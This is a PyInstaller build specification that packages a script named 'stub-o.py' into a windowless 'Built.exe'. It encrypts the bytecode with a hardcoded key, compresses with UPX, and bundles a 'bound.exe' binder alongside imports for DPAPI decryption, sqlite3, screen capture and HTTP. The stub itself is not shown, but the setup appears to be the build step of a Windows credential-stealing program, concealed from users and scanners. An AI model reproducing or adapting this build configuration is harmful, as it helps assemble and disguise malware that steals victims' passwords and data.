# -*- mode: python ; coding: utf-8 -*-


block_cipher = pyi_crypto.PyiBlockCipher(key='3061601548727176')


a = Analysis(
    ['stub-o.py'],
    pathex=[],
    binaries=[('rar.exe', '.'), ('bound.exe', '.')],
    datas=[('Camera', '.'), ('rarreg.key', '.')],
    hiddenimports=['urllib3', 'sqlite3', 'PIL.Image', 'PIL.ImageGrab', 'PIL.ImageStat', 'pyaes', 'DPAPI', 'json'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='Built.exe',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version='version.txt',
    icon='NONE',
)
